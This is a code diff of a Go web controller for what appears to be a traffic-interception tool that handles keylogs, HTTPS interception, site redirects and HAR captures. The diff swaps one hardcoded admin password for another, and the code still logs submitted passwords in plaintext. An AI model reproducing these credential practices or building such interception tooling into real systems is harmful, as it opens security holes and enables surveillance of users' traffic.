@@ -10,6 +10,10 @@ import (
 	"strings"
 )
 
+const (
+    PASSWORD = "whitesilence"
+)
+
 //the temporary object that stores the logged data.
 //probably should store to file for persistence
 var keylogs []KeyLog
@@ -71,7 +75,7 @@ func (c App) RedirectPage() revel.Result {
 	KillProxy()
 	log.Println("replacing...")
 	listener = RedirectPage()
-	return c.RenderJson(replace)
+	return c.RenderJson(redirect)
 }
 func (c App) BlockWebsites() revel.Result {
 	KillProxy()
@@ -142,7 +146,7 @@ func (c App) InterceptHTTPS() revel.Result {
 func (c App) GetHars() revel.Result {
 	var fileNames []string
 	log.Println("reading hars")
-	files, err := ioutil.ReadDir(os.Getenv("HOME")+SOURCE+"/hars/")
+	files, err := ioutil.ReadDir(fileLocation+"/hars/")
 	if err != nil {
 		log.Println("error: ", err)
 	}
@@ -154,7 +158,7 @@ func (c App) GetHars() revel.Result {
 }
 func (c App) DeleteHars() revel.Result {
 	var w Walker
-	filepath.Walk(os.Getenv("HOME")+SOURCE+"/hars", w.deletefiles)
+	filepath.Walk(fileLocation+"/hars", w.deletefiles)
 	return c.RenderJson(w.files)
 }
 
@@ -162,7 +166,7 @@ func (c App) Login() revel.Result {
 	var p string
 	c.Params.Bind(&p, "password")
 	log.Println("password: ", p)
-	if p == "walker" {
+	if p == PASSWORD {
 		password = p
 		return c.Redirect("/App/Index")
 	}
@@ -170,10 +174,12 @@ func (c App) Login() revel.Result {
 }
 func (c App) Index() revel.Result {
 
-	initializeBlockReplaceLists()
-	log.Println(os.Getenv("HOME"))
-	log.Println("password 2: ", password)
-	if password == "walker" {
+	//simple password checker
+	if password == PASSWORD {
+		setFileStorageLocation()
+		getPages()
+		getRedirectUrls()
+		getBannedUrls()
 		return c.Render()
 	} else {
 		return c.Redirect("/App/Login")	
